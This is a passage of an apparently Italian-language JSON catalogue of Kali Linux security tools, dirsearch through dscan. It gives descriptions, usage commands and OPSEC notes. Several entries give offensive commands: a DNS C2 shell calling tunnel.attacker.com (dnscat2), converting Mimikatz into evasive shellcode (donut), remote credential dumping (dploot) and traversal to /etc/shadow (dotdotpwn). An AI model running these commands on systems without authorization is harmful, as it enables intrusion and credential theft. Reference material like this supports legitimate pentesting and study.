    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Dirsearch</strong> è un tool Python avanzato per la content discovery web. Si distingue per le wordlist integrate di alta qualità, la gestione intelligente delle estensioni (testa automaticamente .php, .html, .js per ogni path) e l'output chiaro e colorato. È più user-friendly di gobuster pur mantenendo ottime performance.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Smart Extensions:</strong> Testa automaticamente ogni path con multiple estensioni configurabili.</p><p><strong>Recursive Mode:</strong> Esplora automaticamente le directory trovate.</p><p><strong>Response Filtering:</strong> Filtra risultati per status code, size e pattern nel contenuto.</p><p><strong>Multiple Targets:</strong> Può scansionare lista di target da file.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scansione completa con esclusioni intelligenti\ndirsearch -u http://target.com/ -e php,asp,aspx,jsp,bak,old,zip \\\n  --exclude-status=404,403,500 --exclude-sizes=0B --random-agent\n\n# Ricorsivo con depth e output JSON\ndirsearch -u http://target.com/ -r --max-recursion-depth=3 -t 50 -o results.json --format=json\n\n# Con autenticazione e cookie\ndirsearch -u http://target.com/admin/ -H \"Authorization: Bearer TOKEN\" \\\n  -H \"Cookie: session=abc123\" -e php\n\n# Wordlist custom + built-in\ndirsearch -u http://target.com/ -w /usr/share/seclists/Discovery/Web-Content/big.txt \\\n  --suffixes=~,.bak,.swp,.orig\n\n# Bulk scan da lista URL\ndirsearch -l urls.txt -e php -t 30 -q --plain-text-report=results.txt\n\n# Force extensions su tutti i path\ndirsearch -u http://target.com/ -e php --force-extensions\n\n# Proxy per analisi Burp\ndirsearch -u http://target.com/ --proxy=http://127.0.0.1:8080 --tor\n\n# Delay per rate limiting\ndirsearch -u http://target.com/ --delay=0.5 -t 10</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Preferito per <strong>Bug Bounty</strong> per la combinazione di velocità e funzionalità. Le wordlist integrate sono ottimizzate. Per <strong>Web Pentesting</strong> quotidiano quando si vuole un tool semplice ma potente.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Come tutti i fuzzer, genera molto traffico. Usare --delay per rate limiting.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "dislocker",
    "name": "dislocker",
    "version": "0.7.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dislocker/",
    "desc": "Decritta volumi BitLocker usando recovery key, password o VMK.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Dislocker</strong> permette di montare e accedere a volumi cifrati con BitLocker da Linux. Supporta vari metodi di autenticazione: recovery key (48 cifre), password utente, BEK file (startup key) o direttamente il VMK (Volume Master Key) se già estratto. È essenziale per forensics su sistemi Windows moderni dove BitLocker è sempre più comune.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multiple Auth Methods:</strong> Recovery key, password, BEK file, VMK/FVEK diretto.</p><p><strong>FUSE Mount:</strong> Presenta il volume decifrato come file virtuale montabile.</p><p><strong>Read/Write:</strong> Supporta sia lettura che scrittura (attenzione in forensics!).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Con recovery key\ndislocker -r -V /dev/sda1 -p123456-123456-123456-123456-123456-123456-123456-123456 /mnt/decrypted\n\n# Con password\ndislocker -r -V /dev/sda1 -uMyPassword /mnt/decrypted\n\n# Montare il file decifrato\nmount -o loop /mnt/decrypted/dislocker-file /mnt/windows</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Digital Forensics</strong>, analizza dischi BitLocker quando si ha la recovery key (spesso salvata in AD).</p><p>Per <strong>Incident Response</strong>, accede a sistemi compromessi con encryption.</p><p>Per <strong>Recovery</strong>, quando Windows non boota ma si ha la key.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Forense:</strong> Usare -r (read-only) per preservare l'integrità. Lavorare sempre su copie.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "dmitry",
    "name": "dmitry",
    "version": "1.3a",
    "icon": "../app/icons/dmitry-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dmitry/",
    "desc": "Tool OSINT per whois, subdomain enum, email harvesting e port scan.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DMitry</strong> (Deepmagic Information Gathering Tool) è un'utility all-in-one per la raccolta di informazioni su un dominio. Esegue whois lookup, ricerca sottodomini, estrae email dai risultati, esegue port scan TCP e raccoglie informazioni da Netcraft. È un tool legacy ma ancora utile per reconnaissance rapida con un singolo comando.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Whois Lookup:</strong> Interroga database WHOIS per informazioni di registrazione.</p><p><strong>Subdomain Search:</strong> Cerca sottodomini usando tecniche passive.</p><p><strong>Email Harvesting:</strong> Estrae indirizzi email associati al dominio.</p><p><strong>Port Scanning:</strong> TCP connect scan base su porte comuni.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Tutte le funzionalità\ndmitry -winsepbo output.txt target.com\n\n# Solo whois e subdomains\ndmitry -ws target.com\n\n# Con port scan\ndmitry -p target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Quick Recon</strong> iniziale su un target.</p><p>Quando serve un'overview rapida senza configurare tool più complessi. Per <strong>CTF</strong> e learning, mostra le basi della reconnaissance.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Alternative:</strong> Tool più moderni (Amass, subfinder, theHarvester) sono più potenti. DMitry è più per uso legacy.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "dnscat2",
    "name": "dnscat2",
    "version": "0.07",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dnscat2/",
    "desc": "C2 e tunnel su DNS per comunicazioni nascoste in ambienti restrittivi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Dnscat2</strong> è un framework C2 completo che opera interamente su DNS, progettato per ambienti dove l'unico traffico permesso è verso server DNS. Fornisce shell interattive, upload/download file e port forwarding, tutto nascosto in query DNS legittime. Include sia il server (Ruby) che client (C) cross-platform.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Command Shell:</strong> Shell interattiva sul target via DNS.</p><p><strong>File Transfer:</strong> Upload e download file attraverso il tunnel.</p><p><strong>Port Forwarding:</strong> Crea tunnel per raggiungere servizi interni.</p><p><strong>Encryption:</strong> Tutto il traffico è cifrato end-to-end.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Server (attacker)\nruby dnscat2.rb tunnel.attacker.com\n\n# Client (target)\n./dnscat --dns server=tunnel.attacker.com\n\n# Dal server, interagire:\ndnscat2> session -i 1\ncommand> shell</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Red Team</strong>, quando egress filtering blocca tutto tranne DNS.</p><p>Per <strong>Covert C2</strong> in ambienti ad alta sorveglianza dove HTTP/HTTPS sono monitorati. Backup C2 channel quando il primario è bloccato.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Il volume di query DNS è anomalo. I SOC moderni monitorano DNS tunneling. Usare con moderazione.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "dnsenum",
    "name": "dnsenum",
    "version": "1.3.2",
    "icon": "../app/icons/dnsenum-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dnsenum/",
    "desc": "Enumerazione DNS: zone transfer, brute force subdomain, reverse lookup.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DNSenum</strong> è uno script Perl per la raccolta completa di informazioni DNS su un dominio. Esegue automaticamente zone transfer (AXFR), brute force di sottodomini con wordlist, reverse lookup sui netblock trovati e cerca informazioni aggiuntive su Google. È uno dei tool classici per la reconnaissance DNS.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Zone Transfer:</strong> Tenta AXFR su tutti i nameserver del dominio.</p><p><strong>Subdomain Brute Force:</strong> Testa sottodomini da wordlist configurabile.</p><p><strong>Reverse Lookup:</strong> Risolve inversamente i netblock trovati per scoprire altri host.</p><p><strong>Google Scraping:</strong> Cerca sottodomini indicizzati da Google.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumerazione completa\ndnsenum target.com\n\n# Con wordlist custom\ndnsenum --enum -f subdomains.txt target.com\n\n# Thread multipli\ndnsenum --threads 10 target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella <strong>Reconnaissance</strong>, è un buon punto di partenza per DNS enum.</p><p>Zone transfer quando funziona rivela l'intera zona. Per <strong>Learning</strong>, mostra le tecniche classiche di DNS enumeration.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Alternative:</strong> Tool più moderni (Amass, subfinder) sono più efficaci. Zone transfer raramente funziona su target reali.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "dnsgen",
    "name": "dnsgen",
    "version": "1.0.4",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dnsgen/",
    "desc": "Genera permutazioni di subdomain da wordlist esistenti per discovery.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DNSgen</strong> è un tool Python che genera permutazioni di subdomain partendo da una lista esistente di domini. Applica pattern intelligenti come aggiunta di numeri, parole comuni, swap di caratteri e combinazioni per scoprire subdomain non ancora enumerati. Integrato nella pipeline con massdns per risoluzione veloce.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Permutation Engine:</strong> Genera varianti basate su pattern comuni (dev, staging, prod, numeri).</p><p><strong>Word Extraction:</strong> Estrae parole dai subdomain esistenti per creare nuove combinazioni.</p><p><strong>Pipeline Ready:</strong> Output compatibile con massdns, dnsx e altri resolver.</p><p><strong>Custom Wordlist:</strong> Supporta wordlist aggiuntive per permutazioni specifiche.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Genera permutazioni da lista esistente\ncat subdomains.txt | dnsgen - > permutations.txt\n\n# Con wordlist custom\ncat subdomains.txt | dnsgen -w words.txt -\n\n# Pipeline completa con massdns\ncat subs.txt | dnsgen - | massdns -r resolvers.txt -o S</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Subdomain Discovery</strong>, amplifica i risultati di subfinder/amass con permutazioni intelligenti.</p><p>Nel <strong>Bug Bounty</strong>, trova subdomain nascosti che altri hunter hanno mancato.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Volume:</strong> Genera migliaia di query DNS, usa resolver distribuiti per evitare rate limiting.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "dnsmap",
    "name": "dnsmap",
    "version": "0.36",
    "icon": "../app/icons/dnsmap-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dnsmap/",
    "desc": "Brute force subdomain con wordlist per enumerare host nascosti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DNSmap</strong> è un tool per subdomain brute forcing che testa sistematicamente nomi di subdomain da wordlist contro un dominio target. Semplice ma efficace, è stato uno dei primi tool per questa tecnica. Supporta output in formato CSV e log dettagliati.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Wordlist Brute Force:</strong> Testa ogni entry della wordlist come subdomain.</p><p><strong>Built-in Wordlist:</strong> Include una wordlist di default con subdomain comuni.</p><p><strong>Delay Configurable:</strong> Imposta delay tra query per evitare detection.</p><p><strong>Output Formats:</strong> Salva risultati in formato CSV per analisi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan con wordlist di default\ndnsmap target.com\n\n# Con wordlist custom\ndnsmap target.com -w subdomains.txt\n\n# Con delay tra query\ndnsmap target.com -d 100\n\n# Salva in CSV\ndnsmap target.com -c -r results/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Basic Enumeration</strong>, punto di partenza semplice per subdomain discovery.</p><p>Tool classico per <strong>Learning</strong> le tecniche di DNS enumeration.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Alternative:</strong> Tool moderni come subfinder, amass sono più efficaci. Query DNS facilmente loggabili.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "dnsrecon",
    "name": "dnsrecon",
    "version": "1.2.0",
    "icon": "../app/icons/dnsrecon-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dnsrecon/",
    "desc": "Ricognizione DNS completa: zone transfer, cache snoop, brute force, DNSSEC.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DNSrecon</strong> è uno degli script di ricognizione DNS più completi disponibili. Scritto in Python, combina multiple tecniche: zone transfer, brute force, reverse lookup, cache snooping, enumerazione DNSSEC e lookup di record SPF/SOA/MX. Output in formati multipli per integrazione con altri tool.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Zone Transfer:</strong> Tenta AXFR su tutti i nameserver individuati.</p><p><strong>Cache Snooping:</strong> Verifica se il DNS ha in cache specifici record.</p><p><strong>DNSSEC Enum:</strong> Enumera zone DNSSEC usando NSEC walking.</p><p><strong>Brute Force:</strong> Subdomain discovery con wordlist e thread multipli.</p><p><strong>Google Enum:</strong> Cerca subdomain via Google dorking.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumerazione standard\ndnsrecon -d target.com\n\n# Zone transfer\ndnsrecon -d target.com -t axfr\n\n# Brute force con wordlist\ndnsrecon -d target.com -t brt -D subdomains.txt\n\n# DNSSEC zone walking\ndnsrecon -d target.com -t zonewalk\n\n# Output JSON\ndnsrecon -d target.com -j output.json</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella <strong>Reconnaissance</strong>, è il tool go-to per DNS enumeration completa.</p><p>Per <strong>DNSSEC Analysis</strong>, zone walking su domini mal configurati.</p><p>Tool essenziale per <strong>Pentest</strong> su infrastrutture on-premise.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Query multiple sono facilmente loggabili. Zone transfer tentativi vengono quasi sempre loggati.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "dnstracer",
    "name": "dnstracer",
    "version": "1.9",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dnstracer/",
    "desc": "Traccia la catena di risoluzione DNS dai root server al target.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DNStracer</strong> traccia la catena di delega DNS partendo dai root server fino al nameserver autoritativo per un dominio. Mostra ogni hop nella risoluzione, identificando nameserver intermedi e potenziali problemi di configurazione. Utile per debugging DNS e analisi dell'infrastruttura.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Delegation Tracing:</strong> Segue la catena completa di delega DNS.</p><p><strong>Root Server Start:</strong> Inizia dai root server per traccia completa.</p><p><strong>Query Analysis:</strong> Mostra ogni query e risposta nella catena.</p><p><strong>Verbose Output:</strong> Dettagli su TTL, glue record e referral.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Traccia base\ndnstracer target.com\n\n# Query specifico record type\ndnstracer -q MX target.com\n\n# Verbose con retry\ndnstracer -v -r 3 target.com\n\n# Specifica root server\ndnstracer -s a.root-servers.net target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>DNS Debugging</strong>, identifica dove fallisce la risoluzione.</p><p>Nell'<strong>Infrastructure Analysis</strong>, mappa la catena di delega e nameserver utilizzati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Passive:</strong> Query DNS standard, basso profilo. Utile per capire l'infrastruttura target senza attività invasiva.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "dnstwist",
    "name": "dnstwist",
    "version": "0~20250130",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dnstwist/",
    "desc": "Trova domini typosquatting e phishing simili al tuo brand.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DNStwist</strong> è un tool per individuare domini di typosquatting, phishing e brand impersonation. Genera permutazioni del dominio target (typo, homoglyph, bitsquatting, insertion, omission) e verifica quali sono registrati. Essenziale per brand protection e threat intelligence.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Fuzzing Algorithms:</strong> Genera permutazioni con 15+ algoritmi diversi.</p><p><strong>Homoglyph Detection:</strong> Trova domini con caratteri Unicode visivamente simili.</p><p><strong>WHOIS/MX/NS:</strong> Raccoglie info su domini registrati trovati.</p><p><strong>Screenshot:</strong> Cattura screenshot dei siti sospetti trovati.</p><p><strong>GeoIP:</strong> Identifica la location dei server.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan base\ndnstwist example.com\n\n# Con screenshot e output JSON\ndnstwist --screenshots shots/ -f json example.com\n\n# Include WHOIS e MX\ndnstwist --whois --mxcheck example.com\n\n# Solo domini registrati\ndnstwist --registered example.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Brand Protection</strong>, identifica domini di phishing che imitano il tuo brand.</p><p>Nella <strong>Threat Intelligence</strong>, traccia campagne di typosquatting.</p><p>Per <strong>Blue Team</strong>, crea watchlist di domini sospetti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Difensivo:</strong> Tool primariamente difensivo per protezione brand. Query DNS e WHOIS sono normali attività.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "dnswalk",
    "name": "dnswalk",
    "version": "2.0.2.dfsg.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dnswalk/",
    "desc": "Debugger DNS che verifica configurazioni di zona e problemi comuni.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DNSwalk</strong> è un debugger DNS che esegue zone transfer e verifica la configurazione per problemi comuni. Controlla record orfani, PTR mancanti, CNAME loops, delegation inconsistencies e altri errori di configurazione DNS. Utile per audit di zone DNS.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Zone Analysis:</strong> Analizza zone complete per errori di configurazione.</p><p><strong>PTR Checking:</strong> Verifica consistenza tra record A e PTR.</p><p><strong>Delegation Check:</strong> Controlla che le deleghe siano corrette.</p><p><strong>CNAME Validation:</strong> Individua CNAME chain e loop.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Check zona (nota: trailing dot)\ndnswalk target.com.\n\n# Debug verbose\ndnswalk -d target.com.\n\n# Forza zone transfer\ndnswalk -r target.com.\n\n# Check ricorsivo subzone\ndnswalk -a target.com.</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>DNS Auditing</strong>, verifica configurazioni prima di attacchi.</p><p>Nella <strong>Reconnaissance</strong>, identifica misconfiguration sfruttabili.</p><p>Tool utile per <strong>Blue Team</strong> che verificano la propria infrastruttura.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Prerequisito:</strong> Richiede zone transfer abilitato, raro su target moderni.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "donut-shellcode",
    "name": "donut-shellcode",
    "version": "1.1",
    "icon": "../app/icons/donut-shellcode-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/donut-shellcode/",
    "desc": "Converte .NET, PE, VBS in shellcode position-independent per injection.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Donut è un generatore di shellcode position-independent che converte assembly .NET, eseguibili PE, VBScript e JScript in shellcode iniettabile. Il payload risultante carica ed esegue in memoria senza toccare disco. Essenziale per evasion e payload delivery in red team operations.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>.NET Support:</strong> Converte qualsiasi assembly .NET in shellcode.</p><p><strong>PE Conversion:</strong> Supporta EXE e DLL native.</p><p><strong>Encryption:</strong> Cifra payload con Chaskey block cipher.</p><p><strong>AMSI/WLDP Bypass:</strong> Include bypass per protezioni Microsoft.</p><p><strong>Compression:</strong> Comprime payload per ridurre dimensioni.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Converti .NET assembly\ndonut -f mimikatz.exe -o payload.bin\n\n# Con encryption e compression\ndonut -f payload.exe -o shell.bin -e 3 -z 2\n\n# Specifica entry point per DLL\ndonut -f evil.dll -m DllMain -o shell.bin\n\n# Parametri per l'eseguibile\ndonut -f rubeus.exe -p \"kerberoast\" -o rubeus.bin</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Red Team</strong>, converte tool come Mimikatz in shellcode per injection.</p><p>Nel <strong>Payload Development</strong>, crea payload per loader custom.</p><p>Essenziale per <strong>AV Evasion</strong> caricando in memoria.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Signature:</strong> Donut shellcode ha signature conosciute. Considera encoding aggiuntivo o loader custom.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "04_Red_Team",
      "Payload_Generation"
    ],
    "notes": null
  },
  {
    "id": "dotdotpwn",
    "name": "dotdotpwn",
    "version": "3.0.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dotdotpwn/",
    "desc": "Fuzzer per directory traversal su HTTP, FTP, TFTP, payload multipli.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DotDotPwn</strong> è un fuzzer specifico per vulnerabilità di directory traversal (path traversal). Testa automaticamente centinaia di payload su diversi protocolli (HTTP, FTP, TFTP, payload-based) cercando di accedere a file sensibili come /etc/passwd. Include encoding multipli per bypass di filtri.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Protocol:</strong> Supporta HTTP, HTTPS, FTP, TFTP.</p><p><strong>Encoding Bypass:</strong> URL encoding, double encoding, unicode, null byte.</p><p><strong>Depth Control:</strong> Configura profondità massima di traversal.</p><p><strong>Custom Payloads:</strong> Definisci file target e payload custom.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Test HTTP\ndotdotpwn -m http -h target.com\n\n# FTP con profondità specifica\ndotdotpwn -m ftp -h target.com -d 8\n\n# HTTP con URL custom\ndotdotpwn -m http-url -u 'http://target/page.php?file=TRAVERSAL'\n\n# Con file target specifico\ndotdotpwn -m http -h target.com -f /etc/shadow</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>LFI Testing</strong>, automatizza discovery di path traversal.</p><p>Nel <strong>Web Pentesting</strong>, testa rapidamente parametri vulnerabili.</p><p>Utile per <strong>CTF</strong> su challenge web.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rumoroso:</strong> Genera centinaia di request anomale, facilmente rilevabile da WAF/IDS.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "LFI"
    ],
    "notes": null
  },
  {
    "id": "dploot",
    "name": "dploot",
    "version": "3.1.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dploot/",
    "desc": "Estrae credenziali DPAPI da Windows: browser passwords, WiFi, certificates.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DPloot</strong> è un tool Python per l'estrazione remota di credenziali protette da DPAPI su Windows. Recupera password dei browser (Chrome, Edge, Firefox), credenziali WiFi, certificati e vault credentials. Opera via SMB senza necessità di esecuzione sulla macchina target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Browser Credentials:</strong> Estrae password salvate da Chrome, Edge, Firefox.</p><p><strong>DPAPI Masterkey:</strong> Recupera e decripta DPAPI master key.</p><p><strong>WiFi Passwords:</strong> Estrae credenziali WiFi salvate.</p><p><strong>Certificate Extraction:</strong> Recupera certificati e chiavi private.</p><p><strong>Remote Operation:</strong> Opera via SMB senza agente sul target.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Dump browser credentials\ndploot browser -u admin -p password -d domain.local target\n\n# Estrai WiFi passwords\ndploot wifi -u admin -p password target\n\n# Dump certificates\ndploot certificates -u admin -p password target\n\n# Con hash NTLM\ndploot browser -u admin -H NTLMHASH target</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>Post-Exploitation</strong>, estrai credenziali per lateral movement.</p><p>Per <strong>Privilege Escalation</strong>, trova password riutilizzate.</p><p>Essenziale in <strong>AD Pentesting</strong> per raccolta credenziali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>SMB Access:</strong> Richiede accesso admin al target. Accessi SMB a profili utente possono essere rilevati.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "driftnet",
    "name": "driftnet",
    "version": "1.5.0",
    "icon": "../app/icons/driftnet-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/driftnet/",
    "desc": "Cattura immagini e media dal traffico di rete in tempo reale.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Driftnet</strong> è uno sniffer specializzato che estrae immagini e contenuti multimediali dal traffico di rete. Cattura JPEG, GIF, PNG e stream audio MPEG dal traffico HTTP non cifrato. Visualizza le immagini in tempo reale in una finestra grafica o le salva su disco.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Image Extraction:</strong> Cattura JPEG, GIF, PNG dal traffico.</p><p><strong>Audio Capture:</strong> Estrae stream audio MPEG.</p><p><strong>Live Display:</strong> Mostra immagini in tempo reale in GUI.</p><p><strong>Adjunct Mode:</strong> Lavora con output di altri sniffer.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cattura su interfaccia\ndriftnet -i eth0\n\n# Salva immagini in directory\ndriftnet -i eth0 -d captured_images/\n\n# Solo cattura, no display\ndriftnet -i eth0 -a -d images/\n\n# Da file pcap\ndriftnet -f capture.pcap</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Analysis</strong>, visualizza traffico HTTP intercettato.</p><p>Nel <strong>MITM</strong>, mostra cosa vede la vittima.</p><p>Demo visiva per <strong>Awareness</strong> sulla sicurezza del traffico non cifrato.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Limitazione:</strong> Inefficace su HTTPS. Richiede posizione MITM o accesso al traffico.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "dscan",
    "name": "dscan",
    "version": "0.1.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dscan/",
    "desc": "Scanner distribuito per ricognizione su larga scala con worker multipli.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DScan</strong> è uno scanner di rete distribuito progettato per ricognizione su larga scala. Supporta architettura master/worker per distribuire il carico di scansione su macchine multiple. Integra Nmap per il lavoro effettivo di scanning con coordinamento centralizzato dei risultati.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Distributed Architecture:</strong> Master coordina worker multipli.</p><p><strong>Nmap Backend:</strong> Usa Nmap per le scansioni effettive.</p><p><strong>Result Aggregation:</strong> Raccoglie e unifica risultati da tutti i worker.</p><p><strong>Task Distribution:</strong> Divide target range tra worker automaticamente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia master\ndscan master -p 8080\n\n# Avvia worker\ndscan worker -m master:8080\n\n# Avvia scan\ndscan scan -t targets.txt --ports 1-1000\n\n# Con options nmap\ndscan scan -t 192.168.0.0/16 --nmap-opts \"-sV\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Large 